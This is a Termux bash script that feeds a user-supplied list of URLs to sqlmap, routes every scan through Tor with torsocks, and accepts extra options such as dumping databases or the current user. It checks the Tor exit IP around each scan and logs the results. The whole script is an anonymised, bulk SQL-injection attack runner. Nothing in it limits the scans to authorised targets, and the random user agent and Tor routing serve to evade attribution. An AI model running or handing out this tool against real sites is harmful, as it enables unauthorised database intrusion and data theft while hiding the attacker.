#!/data/data/com.termux/files/usr/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
RESET="\033[0m"

echo -e "${GREEN}🛡️  SQLMap via Tor Auto-Runner with URL List + IP Check + Logging${RESET}"

# Check if Tor is running
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor service...${RESET}"
    tor & sleep 5
else
    echo -e "${GREEN}[✓] Tor is already running${RESET}"
fi

# Ask for URL list file
read -p "📁 Enter path to URL list file (one URL per line): " url_file
if [[ ! -f "$url_file" ]]; then
    echo -e "${RED}[!] File not found: $url_file${RESET}"
    exit 1
fi

# Ask for additional sqlmap options (optional)
read -p "⚙️  Enter extra SQLMap options (e.g. --dbs --current-user), or press Enter to skip: " extra_options

# Loop through URLs
while IFS= read -r url; do
    if [[ -z "$url" ]]; then
        continue
    fi

    echo -e "\n🔍 Target: $url"

    # Check Tor IP before scan
    echo -ne "➡️  Tor IP before scan: "
    torsocks curl -s https://ifconfig.me || echo "Error checking IP"

    echo -e "🚀 Launching SQLMap on ${url}...\n"

    # Extract domain for log filename
    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    mkdir -p logs

    # Run sqlmap via torsocks (no --proxy or --tor flags!)
    torsocks python3 sqlmap/sqlmap.py -u "$url" \
        --random-agent \
        --delay=3 \
        --timeout=30 \
        --retries=2 \
        --batch \
        $extra_options | tee "logs/${log_name}.log"

    # Tor IP after scan
    echo -ne "\n⬅️  Tor IP after scan: "
    torsocks curl -s https://ifconfig.me || echo "Error checking IP"
    echo -e "\n📝 Output saved to: logs/${log_name}.log"
    echo "--------------------------------------------"

done < "$url_file"
